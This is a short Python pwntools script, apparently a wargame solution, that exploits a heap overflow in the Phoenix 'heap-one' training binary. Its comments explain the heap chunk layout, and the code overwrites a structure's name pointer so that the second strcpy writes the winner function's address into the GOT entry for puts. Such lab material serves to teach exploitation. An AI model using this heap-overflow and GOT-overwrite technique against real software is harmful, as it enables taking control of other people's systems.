#!/usr/bin/env python3
from pwn import *

path = "/opt/phoenix/i486/heap-one"
context.binary = path
# context.log_level = "debug"

# bruh why is it linked against musl, gef's heap cmd doesn't work

# Before first strcpy
# | prev size | cur size  | priority  | name      | -- i1
# | prev size | cur size  | name str              | -- i1-> name
# | prev size | cur size  | priority  | name      | -- i2
# | prev size | cur size  | name str              | -- i2-> name
#
# Note that although name = malloc(8), malloc is free to
# allocate more, e.g., to satisfy alignment; in this case name has
# 16 bytes.
# The chunk size field is 0x21 = 16 (user data) + 16 (metadata) + 1 (PREV_INUSE bit)
#
# After first strcpy
# | prev size |  cur size |  priority | name      | -- i1
# | prev size |  cur size |  <1st>      <2nd>     | -- i1-> name
# |   <3rd>   |    <4th>  |  <5th>    | <address> | -- i2
# | prev size |  cur size |  name str             | -- i2-> name
#
# We can use the second strcpy to copy address of winner to GOT of puts.

puts_gotplt = 0x804C140
argv1 = cyclic(5 * 4) + pack(puts_gotplt)
argv2 = pack(0x804889A)

io = process([path, argv1, argv2])
print(io.recvline())
